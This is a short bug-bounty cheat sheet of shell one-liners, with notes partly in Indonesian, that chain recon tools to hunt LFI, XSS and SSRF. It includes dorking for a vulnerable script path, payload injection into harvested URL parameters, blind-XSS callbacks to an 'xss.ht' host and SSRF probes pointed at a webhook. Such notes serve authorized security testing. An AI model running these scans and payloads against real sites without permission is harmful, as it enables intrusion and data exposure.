# One Liner Bug Bounty
---
> Notes :
> Hati-hati false positive

### LFI
---
1. Using dorking (go-dork)
```bash
$ go-dork -q "inurl:/downlot.php" -p 2 -silent | sed -e 's/\x1b\[[0-9;]*m//g' | qsreplace (lfi payload) | httpx -silent -title -status-code > lfi.txt
```


### XSS
---
1. Using KXSS
```bash
echo "https://redirect.com/" | gau | grep "="| kxss |tee kxss.txt
```

2. [Blind XSS](https://xsshunter.com) using waybackurls + dalfox
```bash
$ waybackurls redacted | gf xss | sed 's/=.*/=/' | sort -u | tee test.txt && cat test.txt | dalfox -b your.xss.ht > blindxss.txt
```

and using subfinder + dnsx
```bash
$ cat domainlist.txt | subfinder | dnsx | waybackurl | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | uro | dalfox pipe -b your.xss.ht -o blindxss.txt
```

### SSRF
---
Untuk webhook saya menggunakan ini [biasanya](https://webhook.site/)
```bash
$ subfinder -d domain.com | httpx -silent -threads 1000 | waybackurls | grep "=" | qsreplace <your webhook> > ssrf.txt
```